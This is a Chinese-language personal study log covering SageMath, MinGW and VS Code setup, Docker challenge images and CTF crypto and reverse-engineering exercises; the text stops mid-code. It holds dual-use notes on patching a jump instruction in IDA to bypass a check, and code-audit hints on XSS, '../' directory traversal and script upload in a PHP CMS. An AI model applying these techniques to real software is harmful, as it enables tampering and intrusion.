<h2 id="sagemath-preparse"><a href="#sagemath-preparse" class="headerlink" title="sagemath-preparse"></a>sagemath-preparse</h2><p>体现参数调用过程，虽然代码还没出来。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230201140710662.png" class="" title="preparse">

<h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><p>无法理解，为啥这种定义能够报错，这出现啥问题了吗？</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202092522249.png" class="" title="question">

<p>……没搞懂，先放弃了。</p>
<p>疑似可解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># original: R.&lt;x&gt; = PolynomialRing(GF(y))</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">R.&lt;x&gt; = GF(y)[]</span><br><span class="line"></span><br><span class="line"><span class="comment"># failed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># success</span></span><br><span class="line">p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">R.&lt;p&gt; = PolynomialRing(GF(y)) <span class="comment"># 定义p为GF(y)环上的多项式未知变量</span></span><br></pre></td></tr></table></figure>

<p><em>0203，不会整，不搞了。</em></p>
<p><em><strong>0208，会整了，先定义。</strong></em></p>
<h1 id="230202"><a href="#230202" class="headerlink" title="230202"></a>230202</h1><h2 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h2><p>MinGW 各版本参数说明<br>MinGW 可以适应不同系统开发环境，因此有几大参数需要进行选择： Version、Architecture、Threads、Exception</p>
<ul>
<li><p>Version：指的是你选择的 GCC 编译器的版本，我选择的是当前最新版本 8.1.0，一般建议选择最新的版本；</p>
</li>
<li><p>Architecture：指的是你的电脑的系统类型，i686 表示的是 32 位的系统类型，x86_64 表示的是 64 位的系统类型；</p>
</li>
<li><p>Threads：指的是线程模型，posix 或 win32</p>
<ul>
<li><p>POSIX（Portable Operating System Interface，可移植操作系统接口），是 UNIX 系统的一个 API 设计标准，很多类 UNIX 系统也在支持兼容这个标准，如 Linux 操作系统。如果在 Windows 下开发 Linux 应用程序，则选择 posix；</p>
</li>
<li><p>Win32，是 Windows 系统下一个 API 设计标准，如果开发 Windows 平台下的应用程序，就需要选择 Win32；</p>
</li>
</ul>
</li>
<li><p>Exception：指的是异常处理模型。i686 系统架构有两种选择：dwarf 和 sjlj；x86_64 系统架构也有两种选择：seh 和 sjlj。</p>
<ul>
<li>sjlj，seh，dwarf 三者的区别：在C++中有 try…throw…catch，当它执行这种结构时，它需要保存现场还原现场，而 sjlj，seh，dwarf 正是实现这类过程的三种方式。</li>
<li>sjlj 全称是 SetJump &#x2F; LongJump，前者设还原点，后者跳到还原点。可用于 32 位或者 64 位系统。</li>
<li>seh（Structured Exception Handling，结构化异常处理）是 Borland 公司的，微软买了其专利使用权，它利用了 FS 段寄存器，将还原点压入栈，收到异常时再弹出。相较而言，sjlj 是 C 标准库就有的东西，seh 在 2014 年前是有专利的，从性能上说 seh 比 sjlj 快。只用于64位系统。</li>
<li>dwarf 只支持32位系统 – 没有永久的运行时间开销 – 需要整个调用堆栈被启用，这意味着exception不能被抛出，例如Windows系统DLL。</li>
</ul>
</li>
<li><p>综上所述：</p>
<ul>
<li>【x86_64 64位】<ol>
<li>seh 是新发明的，而 sjlj 则是古老的。只用于64位系统。</li>
<li>seh 性能比较好，但不支持 32位。 sjlj 稳定性好，支持 32位和64位。</li>
<li>因此，x86_64 系统架构的推荐使用 seh 的异常处理模型。</li>
</ol>
</li>
<li>【i686 32位】<ol>
<li>dwarf 只支持 32 位，而 sjlj 支持 32 位或64 位，但是 dwarf 的性能要优于 sjlj。</li>
<li>因此，i686 系统架构的推荐使用 dwarf 的异常处理模型。</li>
</ol>
</li>
</ul>
</li>
</ul>
<blockquote>
<p> &lt;https: wiki.qt.io&#x3D;”” mingw-64-bit&#x3D;””</p>
</blockquote>
<h2 id="安装mingw"><a href="#安装mingw" class="headerlink" title="安装mingw"></a>安装mingw</h2><p>笑死，一直下载错了。应该是这里的压缩包，之前下载的压缩包一直是源码，难怪找不到bin目录。</p>
<blockquote>
<p><a href="https://sourceforge.net/projects/mingw-w64/files/">MinGW-w64 - for 32 and 64 bit Windows - Browse Files at SourceForge.net</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230202101645612-16758393058582.png" class="" title="true download">

<p>找到bin目录，并且放入环境变量后，直接运行<code>gcc -v</code>，让它自己自动安装。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202102426569.png" class="" title="success">

<p>安装成功之后就是出现这下面最后一行。</p>
<h2 id="把mingw导入VScode中"><a href="#把mingw导入VScode中" class="headerlink" title="把mingw导入VScode中"></a>把mingw导入VScode中</h2><p>关键几个文件具体配置不太理解具体作用。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202130051892.png" class="" title="gcc.exe">

<p><code>c_cpp_properties.json</code>，运行应该是自动检测相关路径然后进行导入。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202130636843.png" class="" title="image-20230202130636843">

<p><code>task.json</code>用来做编译。</p>
<p><code>launch.json</code>执行编译好的文件。</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/394595507">详解Linux下使用vscode编译运行和调试C&#x2F;C++ - 知乎 (zhihu.com)</a></p>
</blockquote>
<h3 id="create-task-json"><a href="#create-task-json" class="headerlink" title="create task.json"></a>create task.json</h3><p>选择 <strong>Terminal</strong>&gt;<strong>Configure Default Build Task</strong> ，将出现一个下拉菜单，显示 C++ 编译器的各种预定义编译任务。选择 <strong>C&#x2F;C++: g++ build active file</strong>。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># task.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: g++.exe build active file&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\x86_64-8.1.0-release-win32-seh-rt_v6-rev0\\mingw64\\bin\\g++.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">				<span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">			<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">				<span class="string">&quot;$gcc&quot;</span></span><br><span class="line">			<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;compiler: D:\\x86_64-8.1.0-release-win32-seh-rt_v6-rev0\\mingw64\\bin\\g++.exe&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>command:</strong> 要运行的程序，此处是g++。</p>
<p><strong>args</strong>： args 数组包含将传递给 g++ 的命令行参数（必须按照编译器预期的顺序指定）。<code>$&#123;file&#125;</code>表示当前打开的待编译的活动文件，对它进行编译，并在当前路径<code>$&#123;fileDirname&#125;</code>生成与活动文件同名无后缀的可执行文件<code>$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;</code>。在本案例中活动文件指helloworld.cpp,所生成的可执行文件为helloworld。</p>
<p><strong>label:</strong> 标签值是将在任务列表中看到的内容；可以随意命名它。</p>
<p>group中的<strong>isDefault</strong>: 值为<strong>true</strong>表示支持通过快捷键ctrl+shift+B来执行该编译任务。如果值改为false，也可以从菜单中选择运行：<strong>Terminal</strong>&gt;<strong>Run Build Task。</strong></p>
<blockquote>
<p>插一句：我去，我是真的都把C语言的相关给整忘了，我都压根没有先编译，我的天。</p>
</blockquote>
<h3 id="run-task-json"><a href="#run-task-json" class="headerlink" title="run task.json"></a>run task.json</h3><p>执行tasks.json中定义的编译任务。快捷键ctrl+shift+B或者从菜单中选择运行：<strong>Terminal&gt;Run Build Task</strong>。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202133848145.png" class="" title="run task.json">

<p>应该这个才是成功吧，瘫。之前的可能端口确实被占用了。</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/272216929">【VSCode】解决“终端将被任务重用，按任意键关闭”问题 - 知乎 (zhihu.com)</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230202135137189.png" class="" title="image-20230202135137189">

<p>然后新开一个terminal窗口，进入</p>
<h3 id="create-launch-json"><a href="#create-launch-json" class="headerlink" title="create launch.json"></a>create launch.json</h3><p><code>launch.json</code>文件用于在 Visual Studio Code 中配置调试器。接下来将创建<code>launch.json</code> 文件。</p>
<p>选择 **Run &gt; Add Configuration…<strong>，选择</strong>C++ (GDB&#x2F;LLDB)**。 之后将看到展示各种预定义调试配置的下拉列表，选择 <strong>g++ build and debug active file</strong>。将自动生成<code>launch.json</code>文件。</p>
<blockquote>
<p>但我没找到。</p>
</blockquote>
<p>虽然没找到，但莫名其妙能运行了。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202164724447.png" class="" title="C&amp;C++">

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>调试逻辑有点让人摸不着头脑。</p>
<p>但能运行就暂且先不整啥东西。</p>
<h1 id="230203"><a href="#230203" class="headerlink" title="230203"></a>230203</h1><p>变种2&#x2F;3，放230201了。</p>
<h1 id="230206"><a href="#230206" class="headerlink" title="230206"></a>230206</h1><h2 id="关于如何运行已上传dockerhub中的环境"><a href="#关于如何运行已上传dockerhub中的环境" class="headerlink" title="关于如何运行已上传dockerhub中的环境"></a>关于如何运行已上传dockerhub中的环境</h2><blockquote>
<p><a href="https://blog.csdn.net/m0_51295655/article/details/128198412">(10条消息) (三) Docker常用命令_docker run 进入已命名的容器_小怪吖的博客-CSDN博客</a></p>
</blockquote>
<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><p>进入超级管理模式。</p>
<ul>
<li><code>docker pull dockerhub账号/dockerhub仓库名称:dockerhub标签名</code></li>
</ul>
<p>以<a href="https://github.com/CTF-Archives/2022-xhlj-crypto-lockbylock">GitHub - CTF-Archives&#x2F;2022-xhlj-crypto-lockbylock: A crypto challenge in 2022 西湖论剑大赛</a>该题上传环境为例。</p>
<p><code>docker pull randark/2022-xhlj-crypto-lockbylock:master</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230206102900410.png" class="" title="pull镜像">

<h3 id="拉取成功"><a href="#拉取成功" class="headerlink" title="拉取成功"></a>拉取成功</h3><ul>
<li><code>docker images</code></li>
</ul>
<p>查看拉取后的镜像。拉取成功。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206103136983.png" class="" title="success">

<h3 id="运行拉取的镜像"><a href="#运行拉取的镜像" class="headerlink" title="运行拉取的镜像"></a>运行拉取的镜像</h3><ul>
<li><code>docker run -tid -p xxxx:80 imageid</code> </li>
<li><em>docker run -tid -P xxxx:80 imageid</em></li>
</ul>
<p>……没成功，咋回事。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206105701169.png" class="" title="image-20230206105701169">

<p>好像是成功的，但我以为没成功。</p>
<ul>
<li><code>docker run -it repository:tag</code></li>
</ul>
<p>停滞其中。</p>
<ul>
<li><code>docker run -it -d --name name -p port:port -v path:path -v file:file -e env=value image:tag /bin/bash </code></li>
</ul>
<p>似乎是完整命令。</p>
<h3 id="查看运行中的程序"><a href="#查看运行中的程序" class="headerlink" title="查看运行中的程序"></a>查看运行中的程序</h3><ul>
<li><code>docker ps</code></li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230206105925190.png" class="" title="image-20230206105925190">

<hr>
<p>还没法用nc连接，迷茫中。</p>
<h2 id="sagemath中文文档以及图形化等功能"><a href="#sagemath中文文档以及图形化等功能" class="headerlink" title="sagemath中文文档以及图形化等功能"></a>sagemath中文文档以及图形化等功能</h2><blockquote>
<p>[绘图 <a href="https://www.lainme.com/doku.php/topic/sage/chapter_02/section_05">Lainme’s Blog]</a></p>
</blockquote>
<h2 id="压缩包炸弹-Zipbomb"><a href="#压缩包炸弹-Zipbomb" class="headerlink" title="压缩包炸弹(Zipbomb)"></a>压缩包炸弹(Zipbomb)</h2><blockquote>
<p>大压缩文件，占据大量内存。</p>
</blockquote>
<h3 id="利用脚本对大压缩文件进行检索"><a href="#利用脚本对大压缩文件进行检索" class="headerlink" title="利用脚本对大压缩文件进行检索"></a>利用脚本对大压缩文件进行检索</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dir_path=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">files= os.listdir(dir_path)</span><br><span class="line">newfiles = [<span class="string">&quot;zipboom.zip&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(newfiles)</span><br><span class="line">setee = []</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> newfiles: <span class="comment">#遍历文件夹</span></span><br><span class="line">    position = dir_path+<span class="string">&#x27;\\&#x27;</span>+ file <span class="comment">#构造绝对路径，&quot;\\&quot;，其中一个&#x27;\&#x27;为转义符</span></span><br><span class="line">    <span class="built_in">print</span> (position)</span><br><span class="line">    z = zipfile.ZipFile(position, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> z.namelist():</span><br><span class="line">        <span class="built_in">bytes</span> = z.read(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> <span class="keyword">in</span> <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure>

<p>运行后得到大压缩文件内含<code>AAAA</code>文件。</p>
<h3 id="提取内含文件的小压缩包"><a href="#提取内含文件的小压缩包" class="headerlink" title="提取内含文件的小压缩包"></a>提取内含文件的小压缩包</h3><p>利用<code>winhex</code>或<code>010editor</code>进行提取，提取完直接解压即可。</p>
<h3 id="简单直接的方法"><a href="#简单直接的方法" class="headerlink" title="简单直接的方法"></a>简单直接的方法</h3><p><code>winrar</code>直接就检索到有效文件<code>AAAA</code>，直接解压就可以了。</p>
<h2 id="re-easyre"><a href="#re-easyre" class="headerlink" title="re-easyre"></a>re-easyre</h2><h3 id="exeinfo查看是否加壳"><a href="#exeinfo查看是否加壳" class="headerlink" title="exeinfo查看是否加壳"></a>exeinfo查看是否加壳</h3><img src="/2023/12/31/WeeklyStudy/image-20230206150242712.png" class="" title="image-20230206150242712">

<p>得到关键信息：</p>
<ul>
<li>64位程序</li>
<li>not packed即未加壳</li>
</ul>
<h3 id="放入ida-64进行分析"><a href="#放入ida-64进行分析" class="headerlink" title="放入ida-64进行分析"></a>放入ida-64进行分析</h3><p>找到main函数的入口，我在这里的话是先看exports模块中的进行查看。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206150453561.png" class="" title="image-20230206150453561">

<p>找到具体位置后，稍微查看一下就直接找到flag了。</p>
<p>【定位之后发现应该就是把程序拖入ida之后直接跳转到的界面。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206150138211.png" class="" title="image-20230206150138211">

<h2 id="re-reverse1"><a href="#re-reverse1" class="headerlink" title="re-reverse1"></a>re-reverse1</h2><p>前面一样的步骤。</p>
<p>得到信息：</p>
<ul>
<li>64位程序文件</li>
<li>未加壳</li>
</ul>
<p>先查看string窗口，发现疑似flag，进行跳转。</p>
<p>跳转完需要进行分析，分析完发现直接提交<code>flag&#123;hello_world&#125;</code>是错误的。</p>
<p>继续当前代码段进行分析，发现对字符进行了一些处理。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230206163323825.png" class="" title="image-20230206163323825">

<img src="/2023/12/31/WeeklyStudy/image-20230206163430292.png" class="" title="image-20230206163430292">

<h2 id="IDA的学习使用"><a href="#IDA的学习使用" class="headerlink" title="IDA的学习使用"></a>IDA的学习使用</h2><h3 id="图形界面-x2F-流程图界面"><a href="#图形界面-x2F-流程图界面" class="headerlink" title="图形界面&#x2F;流程图界面"></a>图形界面&#x2F;流程图界面</h3><p>Yes边的箭头（是的，执行分支）默认为绿色，No边的箭头（不，不执行分支）默认为红色。</p>
<h3 id="如何基于IDA对相关跳转进行修改"><a href="#如何基于IDA对相关跳转进行修改" class="headerlink" title="如何基于IDA对相关跳转进行修改"></a>如何基于IDA对相关跳转进行修改</h3><p>eg: jnz -&gt; jz</p>
<p>利用16进制进行修改，jnz对应的16进制为75，而jz对应的16进制为74，对应到16进制界面，然后右键<code>edit</code>，修改完继续<code>apply change</code>。</p>
<h3 id="修改完相应代码片段，保存为执行文件"><a href="#修改完相应代码片段，保存为执行文件" class="headerlink" title="修改完相应代码片段，保存为执行文件"></a>修改完相应代码片段，保存为执行文件</h3><p><code>Edit</code> -&gt; <code>Patch program</code> -&gt; <code>Apply patches to input file</code></p>
<h1 id="230207"><a href="#230207" class="headerlink" title="230207"></a>230207</h1><h2 id="再探强网拟态密码学cry1"><a href="#再探强网拟态密码学cry1" class="headerlink" title="再探强网拟态密码学cry1"></a>再探强网拟态密码学cry1</h2><p>重新又看了一下这道题，感觉没必要利用原有的加密函数进行解密再进行操作。</p>
<p>主要把flag分成了两部分，而第一部分用简单数学推导也是可以直接把相关量给求解出来。</p>
<h3 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h3><blockquote>
<p>原：利用源代码中的加密逆向写解密算法，中国剩余定理</p>
<p>现：费马小定理进行数学推导</p>
</blockquote>
<p>已知：<br>$$<br>g_1 &#x3D; g^{(p-1) \cdot r_1}\mod p<br>$$</p>
<p>$$<br>c_1 \equiv (m \times g_1^{s_1} \mod N )\mod N<br>$$</p>
<p>推导：主要利用<strong>费马小定理</strong>。<br>$$<br>g_1 &#x3D; g^{(p-1)\cdot r1} \mod p \equiv 1<br>$$</p>
<p>$$<br>\Longrightarrow g_1 - 1 &#x3D; k\cdot p<br>$$</p>
<p>而$N &#x3D; p \times q$，所以此时，$p &#x3D; gcd(g_1 - 1, N)$<br>$$<br>c_1 \equiv (m \times g^{s_1 \cdot r_1  \cdot (p-1)} \mod p) \mod N\<br>\Longrightarrow c_1 \equiv m \mod N<br>$$<br>所以，理论上$m \equiv c_1 \mod N$，但$N$范围太大了，基于$m$的长度不会太大，所以我们进行放缩处理，取$min (m \equiv c_1 \mod p, m\equiv c_1 \mod q)$.</p>
<p>最后推断出，实际上的$m$应为$c_1 \mod p$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = gcd(g1-<span class="number">1</span>, N)</span><br><span class="line">q1 = N // p1</span><br><span class="line">m = c1 % p1</span><br></pre></td></tr></table></figure>



<h3 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h3><blockquote>
<p>原：Groebner basis相关知识点【还没搞懂。</p>
<p>现：转换成三元二次方程进行求解</p>
</blockquote>
<p>先开$e$次方求出关于$ABC$的二次方程。再用<code>roots()</code>进行相应的求解。</p>
<ul>
<li>题目中的$ABC$方程保持不变</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cnt = <span class="built_in">len</span>(Cs)</span><br><span class="line">A = [(i + <span class="number">128</span>)**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">B = [(i + <span class="number">1024</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">C = [(i + <span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br></pre></td></tr></table></figure>

<ul>
<li>对输出的$Cs$进行开$e$次方处理</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Cs:</span><br><span class="line">    C_.append(iroot(i, Cs)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>定义在整数环上的未知变量$m1,m2,m3$</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;m1&gt; = Zmod()[]</span><br><span class="line">P.&lt;m2&gt; = Zmod()[]</span><br><span class="line">P.&lt;m3&gt; = Zmod()[]</span><br></pre></td></tr></table></figure>

<ul>
<li>分别代入原方程中，得到关于$ABC$的二次方程</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = A[<span class="number">0</span>] * m1 ** <span class="number">2</span> + B[<span class="number">0</span>] * m1 + C[<span class="number">0</span>] - <span class="built_in">int</span>(C_[<span class="number">0</span>])</span><br><span class="line">f2 = A[<span class="number">1</span>] * m2 ** <span class="number">2</span> + B[<span class="number">1</span>] * m2 + C[<span class="number">1</span>] - <span class="built_in">int</span>(C_[<span class="number">1</span>])</span><br><span class="line">f3 = A[<span class="number">2</span>] * m3 ** <span class="number">2</span> + B[<span class="number">2</span>] * m3 + C[<span class="number">2</span>] - <span class="built_in">int</span>(C_[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>求根，代值，再转换</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = f1.roots()</span><br><span class="line">v2 = f2.roots()</span><br><span class="line">v3 = f3.roots()</span><br><span class="line"></span><br><span class="line">flag2 = long_to_bytes(v1[<span class="number">0</span>][<span class="number">0</span>]).decode() + long_to_bytes(v2[<span class="number">0</span>][<span class="number">0</span>]).decode() + long_to_bytes(v3[<span class="number">0</span>][<span class="number">0</span>]).decode()</span><br></pre></td></tr></table></figure>

<h2 id="分享-代码审计"><a href="#分享-代码审计" class="headerlink" title="分享-代码审计"></a>分享-代码审计</h2><blockquote>
<p>CLTopen6.0</p>
</blockquote>
<p>网上资产相对较多，代码审计相关。</p>
<p>审计<code>application</code>目录。</p>
<p>敏感数据，先搜索<code>username</code>之类的。查看数据库相关的表结构。</p>
<p><code>callback</code>传参相关，可能存在XSS攻击。</p>
<p>方法是<code>public</code>的才可以进行调用。<em>跟Java会比较相关或说类似？</em></p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>利用<code>Seay</code>等工具先进行代码审计，主要为了找到后台以及一些危险函数。</p>
<p>主要三个工具：</p>
<ul>
<li><code>Seay</code>辅助审计</li>
<li><code>phpstudy</code>搭环境</li>
<li><code>ps</code>php编辑器</li>
</ul>
<h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><ul>
<li><p>直接在地址栏访问类以及方法。</p>
</li>
<li><p>访问成功后，选择参数进行传参。</p>
</li>
<li><p>注意伪静态。</p>
</li>
</ul>
<h3 id="目录穿越？"><a href="#目录穿越？" class="headerlink" title="目录穿越？"></a>目录穿越？</h3><p>不存在的目录影响payload的执行结果，从而影响命令的执行。</p>
<p>linux跟windows执行结果可能不同。</p>
<h3 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h3><p>执行错误，但可以写入<code>public</code>目录。</p>
<p>但需要查看一下关键代码有没有错误，容易被过滤导致上传脚本操作失败。</p>
<p>及时恢复，否则前台可能出现问题。</p>
<p><em>阅读代码的能力还是非常重要的。主要还是得了解函数的具体作用，以及大概的实现流程是怎样的。</em></p>
<p>linux中<code>Type = ../</code></p>
<p><em>因为涉及路径以及绕过等，所以感觉跟命令执行还是结合起来的。以及时刻记得恢复，否则容易挂。</em></p>
<p><em>空了可以尝试一下。稍微熟悉一下审计的流程。</em></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>相对比较容易。</p>
<p>简单的相对来说就是来看<strong>敏感函数</strong>。</p>
<h1 id="230208"><a href="#230208" class="headerlink" title="230208"></a>230208</h1><h2 id="Groebner-basis"><a href="#Groebner-basis" class="headerlink" title="Groebner basis"></a>Groebner basis</h2><p>本子。</p>
<p>空闲整理。</p>
<p>Grobner basis简单讲就是两种算法的扩展延伸：Division algorithm 从单变量到多变量，Gaussian elimination从线性到非线性。</p>
<p>应用方面首先当然是解多变量多项式，其次还可以用于解决ideal membership problem：给你一个理想I，和一个多项式f，I的Grobner basis能告诉你f是否属于I。</p>
<p>Grobner basis算法是<strong>多变量密码核心问题</strong>。多变量密码的公钥就是一组有限域上多变量二次多项式。如果你能解开这组多项式方程组，那么你就能假冒签名，读取加密信息了。应用上没人会用BuchBerger算法来找Grobner basis。因为效率太低了，而且其中很多计算是浪费的。常用的是F4和F5算法。</p>
<h3 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h3><blockquote>
<p> groebner_basis()</p>
</blockquote>
<ul>
<li>定义多变量的多项式环</li>
<li>利用定义好的多项式环构建一个Ideal</li>
<li>调用sage中的函数</li>
</ul>
<h2 id="稀奇古怪的概念"><a href="#稀奇古怪的概念" class="headerlink" title="稀奇古怪的概念"></a>稀奇古怪的概念</h2><ul>
<li>伞形曲面，又称惠特尼伞形面（Whitney umbrella）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u, v = var(&#x27;u,v&#x27;)</span><br><span class="line">fx = u*v</span><br><span class="line">fy = u</span><br><span class="line">fz = v^2</span><br><span class="line">parametric_plot3d([fx, fy, fz], (u, -1, 1), (v, -1, 1),frame=False, color=&quot;yellow&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>KCTF2021秋，第十一题图穷匕见</li>
</ul>
<blockquote>
<p>[<a href="https://bbs.kanxue.com/thread-270784.htm">原创]KCTF2021秋 第十一题 图穷匕见 writeup-CTF对抗-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
</blockquote>
<h1 id="230209"><a href="#230209" class="headerlink" title="230209"></a>230209</h1><h2 id="继续整活Groebner-basis以及Polynomial"><a href="#继续整活Groebner-basis以及Polynomial" class="headerlink" title="继续整活Groebner basis以及Polynomial"></a>继续整活Groebner basis以及Polynomial</h2><h2 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h2><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><blockquote>
<p>DASCTF-NOVX</p>
</blockquote>
<h2 id="sage函数等"><a href="#sage函数等" class="headerlink" title="sage函数等"></a>sage函数等</h2><h3 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate()"></a>enumerate()</h3><blockquote>
<p>迭代工具，类似python中itertools模块</p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230209111213697.png" class="" title="enumerate">

<h3 id="factor-list"><a href="#factor-list" class="headerlink" title="factor_list()"></a>factor_list()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># poly</span></span><br><span class="line"><span class="number">17358416697006</span>*x^<span class="number">15</span> + <span class="number">50380288275413</span>*x^<span class="number">14</span> + <span class="number">65697715730413</span>*x^<span class="number">13</span> + <span class="number">119331879197637</span>*x^<span class="number">12</span> + <span class="number">190079269759081</span>*x^<span class="number">11</span> + <span class="number">251069112740272</span>*x^<span class="number">10</span> + <span class="number">294191461464860</span>*x^<span class="number">9</span> + <span class="number">323192668237103</span>*x^<span class="number">8</span> + <span class="number">348744847375959</span>*x^<span class="number">7</span> + <span class="number">327797569086986</span>*x^<span class="number">6</span> + <span class="number">281393100562123</span>*x^<span class="number">5</span> + <span class="number">205257017269623</span>*x^<span class="number">4</span> + <span class="number">147796447331070</span>*x^<span class="number">3</span> + <span class="number">92272297080147</span>*x^<span class="number">2</span> + <span class="number">44365143036564</span>*x + <span class="number">12197084000688</span></span><br><span class="line">poly.factor_list()</span><br><span class="line">sage: p</span><br><span class="line"><span 